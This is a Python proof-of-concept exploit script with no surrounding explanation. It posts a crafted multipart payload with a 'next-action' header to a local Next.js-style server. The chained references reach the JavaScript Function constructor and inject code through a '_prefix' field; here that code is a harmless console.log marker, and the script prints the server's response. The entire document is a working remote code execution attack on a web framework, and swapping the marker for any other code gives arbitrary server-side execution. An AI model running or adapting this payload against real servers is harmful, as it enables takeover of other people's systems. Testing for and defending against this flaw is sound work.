import json

import requests


payload = {
    '0': '$1',
    '1': {
        'status': 'resolved_model',
        'reason': 0,
        '_response': '$4',
        'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then': '$2:then',
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix': 'console.log(91455)//',
        '_formData': {'get': '$3:constructor:constructor'},
        '_chunks': '$2:_response:_chunks',
    },
}

fields = {
    key: (None, json.dumps(value, separators=(',', ':')))
    for key, value in payload.items()
}

try:
    response = requests.post(
        'http://127.0.0.1:3000/',
        headers={'next-action': 'x'},
        files=fields,
        timeout=10,
        allow_redirects=False,
    )
    print(response.status_code)
    print(response.text)
except requests.RequestException as exc:
    print(type(exc).__name__ + ':', exc)
